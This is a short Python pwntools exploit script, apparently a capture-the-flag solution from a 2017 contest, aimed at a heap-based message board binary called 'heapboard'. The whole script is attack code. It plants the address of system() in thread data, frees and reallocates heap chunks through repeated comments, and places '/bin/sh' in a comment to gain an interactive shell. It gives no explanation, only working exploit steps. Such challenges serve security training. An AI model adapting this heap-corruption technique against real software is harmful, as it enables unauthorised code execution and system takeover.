# THC2017

from pwn import *
import time

r = process('./heapboard')
e = ELF('./heapboard')
context.arch = 'i386'

def new_thread(author, title, content):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Author: ', author)
    r.sendlineafter('Title: ', title)
    r.sendlineafter('Content: ', content)
    r.recvuntil('What do you want to do?')

def comment(index, content):
    r.sendline('2')
    r.sendline(str(index))
    r.sendline('1')
    r.sendline(content)
    r.sendline('4')
    r.recvuntil('What do you want to do?')
    time.sleep(0.1)

def delete(index):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(index))
    r.sendlineafter('> ', '3')
    r.sendlineafter('> ', '4')
    r.recvuntil('What do you want to do?')


new_thread('', '', '')
new_thread(p32(e.symbols['system'])*5, '', '')
new_thread('', '', '')
new_thread('', '', '')

delete(2)

comment(3, '/bin/sh')
for i in range(0x80):
    print i
    comment(3, '')

delete(3)

r.clean()
r.interactive()
